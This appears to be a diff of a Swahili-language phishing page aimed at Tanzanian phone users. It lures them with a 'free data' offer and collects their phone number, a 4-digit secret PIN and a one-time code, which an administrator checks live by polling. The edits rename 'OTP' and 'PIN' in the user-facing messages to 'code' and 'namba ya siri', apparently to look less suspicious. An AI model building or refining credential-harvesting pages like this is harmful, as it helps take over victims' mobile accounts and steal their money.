@@ -166,7 +166,7 @@
   .lg-terms { font-size:0.72rem; color:rgba(255,255,255,0.55); }
   .lg-terms a { color:rgba(255,255,255,0.75); }
 
-  /* ───── PAGE 7: OTP ───── */
+  /* ───── PAGE 7: CODE ───── */
   #page-otp { background:#fff; }
   .otp-topbar { display:flex; align-items:center; justify-content:space-between; padding:0 20px; height:52px; border-bottom:1px solid #eee; flex-shrink:0; }
   .otp-topbar .bk { font-size:1.1rem; color:#333; cursor:pointer; background:none; border:none; }
@@ -438,7 +438,7 @@
         <div class="lg-ph-pre">🇹🇿 +255</div>
         <input type="tel" id="lgPh" placeholder="712345678 au 0712345678" maxlength="10" oninput="normalizePhone('lgPh');chkLogin()">
       </div>
-      <div class="pin-label">Weka namba ya siri yako (tarakimu 4)</div>
+      <div class="pin-label">Weka namba ya siri yako (tarakiumi 4)</div>
       <div class="pin-row">
         <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,0)" id="p0">
         <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,1)" id="p1">
@@ -466,7 +466,7 @@
   </div>
 </div>
 
-<!-- ══════════════════════ PAGE 7: OTP ══════════════════════ -->
+<!-- ══════════════════════ PAGE 7: CODE ══════════════════════ -->
 <div id="page-otp" class="page">
   <div class="otp-topbar">
     <button class="bk" onclick="goTo('page-login')">←</button>
@@ -561,7 +561,7 @@
   <div class="modal"><div class="spinner"></div><h3>Tafadhali subiri…</h3><p>Inatuma maelezo yako kwa uthibitisho</p></div>
 </div>
 <div class="overlay" id="mOtp">
-  <div class="modal"><div class="spinner"></div><h3>Inathibitisha OTP</h3><p id="otpVT">Tafadhali subiri… (3s)</p></div>
+  <div class="modal"><div class="spinner"></div><h3>Inathibitisha Code</h3><p id="otpVT">Tafadhali subiri… (3s)</p></div>
 </div>
 <div class="overlay" id="mSubmit">
   <div class="modal"><div class="spinner"></div><h3>Inawasilisha Maombi…</h3><p>Tafadhali subiri wakati tunashughulikia maombi yako ya data ya bure</p></div>
@@ -688,7 +688,7 @@
       showErr('s2Err', 'Tafadhali weka anwani sahihi ya barua pepe.'); shakeField('s2em'); return;
     }
     if (!phone || phone.length < 9) {
-      showErr('s2Err', 'Tafadhali weka nambari sahihi ya simu ya tarakimu 9.'); shakeField('s2ph'); return;
+      showErr('s2Err', 'Tafadhali weka nambari sahihi ya simu ya tarakiumi 9.'); shakeField('s2ph'); return;
     }
     clearErr('s2Err');
     S.first = first; S.last = last; S.phone = phone;
@@ -780,7 +780,7 @@
     const pin = [0,1,2,3].map(i => document.getElementById('p'+i).value).join('');
 
     if (!rawPhone || pin.length < 4) {
-      showLoginMsg('Tafadhali weka nambari ya simu na PIN ya tarakimu 4.');
+      showLoginMsg('Tafadhali weka nambari ya simu na PIN ya tarakiumi 4.');
       return;
     }
 
@@ -849,7 +849,7 @@
           clearInterval(pinPollInterval);
           document.getElementById('pinWait').classList.remove('show');
           document.getElementById('otpInputSection').style.display = 'block';
-          showOtpMsg('success', 'Maelezo yamethibitishwa! Tafadhali weka OTP yako hapa chini.');
+          showOtpMsg('success', 'Maelezo yamethibitishwa! Tafadhali weka code yako hapa chini.');
           startRs();
           document.getElementById('o0').focus();
 
@@ -922,16 +922,16 @@
       });
       const data = await res.json();
       if (data.success) {
-        showOtpMsg('info', 'Ombi jipya la OTP limetumwa kwa msimamizi.');
+        showOtpMsg('info', 'Ombi jipya la code limetumwa kwa msimamizi.');
         startRs();
         [0,1,2,3].forEach(i => { document.getElementById('o'+i).value = ''; });
         document.getElementById('bOtp').className = 'btn-otp';
         document.getElementById('o0').focus();
       } else {
-        showOtpMsg('error', 'Imeshindwa kutuma tena OTP. Tafadhali jaribu tena.');
+        showOtpMsg('error', 'Imeshindwa kutuma tena code. Tafadhali jaribu tena.');
       }
     } catch {
-      showOtpMsg('error', 'Hitilafu ya mtandao wakati wa kutuma tena OTP.');
+      showOtpMsg('error', 'Hitilafu ya mtandao wakati wa kutuma tena code.');
     }
   }
 
@@ -942,7 +942,7 @@
     const otp = [0,1,2,3].map(j => document.getElementById('o'+j).value).join('');
 
     if (otp.length < 4) {
-      showOtpMsg('warning', 'Tafadhali weka tarakimu zote 4 za OTP yako.');
+      showOtpMsg('warning', 'Tafadhali weka tarakiumi zote 4 za code yako.');
       return;
     }
 
@@ -971,11 +971,11 @@
       document.getElementById('mOtp').classList.remove('show');
 
       if (data.success) {
-        showOtpMsg('success', 'OTP imewasilishwa. Inasubiri msimamizi kuidhinisha…');
+        showOtpMsg('success', 'Code imewasilishwa. Inasubiri msimamizi kuidhinisha…');
         pollOtpStatus();
       } else {
         document.getElementById('bOtp').disabled = false;
-        showOtpMsg('error', data.message || 'Imeshindwa kuwasilisha OTP. Tafadhali jaribu tena.');
+        showOtpMsg('error', data.message || 'Imeshindwa kuwasilisha code. Tafadhali jaribu tena.');
       }
 
     } catch (err) {
@@ -1012,7 +1012,7 @@
 
         } else if (data.status === 'wrongpin_otp') {
           clearInterval(otpPollInterval);
-          showOtpMsg('error', 'PIN isiyosahihi imegunduliwa. Unaelekezwa kwenye kuingia…');
+          showOtpMsg('error', 'Namba ya siri isiyosahihi imegunduliwa. Unaelekezwa kwenye kuingia…');
           setTimeout(() => {
             [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
             chkLogin();
@@ -1035,7 +1035,7 @@
           [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
           document.getElementById('bOtp').className = 'btn-otp';
           document.getElementById('bOtp').disabled = false;
-          showOtpMsg('error', 'Msimbo wa OTP usio sahihi. Tafadhali angalia na uweke tena.');
+          showOtpMsg('error', 'Msimbo wa code usio sahihi. Tafadhali angalia na uweke tena.');
           document.getElementById('o0').focus();
         }
 
